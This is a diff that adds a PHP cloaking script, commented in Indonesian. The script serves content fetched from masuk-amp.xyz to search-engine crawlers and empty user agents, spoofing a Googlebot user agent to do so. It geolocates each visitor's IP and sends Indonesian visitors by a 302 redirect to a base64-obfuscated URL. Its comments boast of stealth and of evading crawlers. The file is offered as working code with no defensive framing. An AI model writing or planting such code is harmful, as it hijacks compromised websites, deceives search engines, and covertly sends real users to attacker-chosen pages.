@@ -1,0 +1,64 @@
+<?php
+header('Cache-Control: no-store, no-cache, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+// Ambil user agent & referer
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+$rf = $_SERVER["HTTP_REFERER"] ?? '';
+
+// Fungsi ambil IP client
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP']
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_X_FORWARDED']
+        ?? $_SERVER['HTTP_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_FORWARDED']
+        ?? $_SERVER['REMOTE_ADDR']
+        ?? getenv('HTTP_CLIENT_IP')
+        ?? getenv('HTTP_X_FORWARDED_FOR')
+        ?? getenv('HTTP_X_FORWARDED')
+        ?? getenv('HTTP_FORWARDED_FOR')
+        ?? getenv('HTTP_FORWARDED')
+        ?? getenv('REMOTE_ADDR')
+        ?? '127.0.0.1';
+}
+
+$ip = get_client_ip();
+
+// URL konten untuk bot & redirect user
+$bot_url = "https://masuk-amp.xyz/cloack/thuyenxua.html";
+$encoded_redirect = "aHR0cHM6Ly9tYXN1ay1hbXAueHl6L3RodXllbnh1YS5odG1s"; 
+$reff_url = base64_decode($encoded_redirect);
+
+// Deteksi negara pakai geoPlugin
+$geo = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+$cc = $geo['geoplugin_countryCode'] ?? '';
+
+// Daftar user-agent bot (ditambah & pakai regex i)
+$botchar = "/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex|sogou|exabot|facebot|facebookexternalhit|ia_archiver|adsbot|mediapartners-google)/i";
+
+// Jika UA kosong atau cocok dengan bot
+if (empty($ua) || preg_match($botchar, $ua)) {
+    // Load konten dari URL via cURL (lebih stealth)
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $bot_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
+    $result = curl_exec($ch);
+    curl_close($ch);
+
+    echo $result;
+    exit;
+}
+
+// Deteksi Indonesia berdasarkan IP
+if ($cc === "ID") {
+    sleep(1); // Delay biar gak instan redirect (anti crawler)
+    header("HTTP/1.1 302 Found");
+    header("Location: $reff_url");
+    exit;
+}
+?>
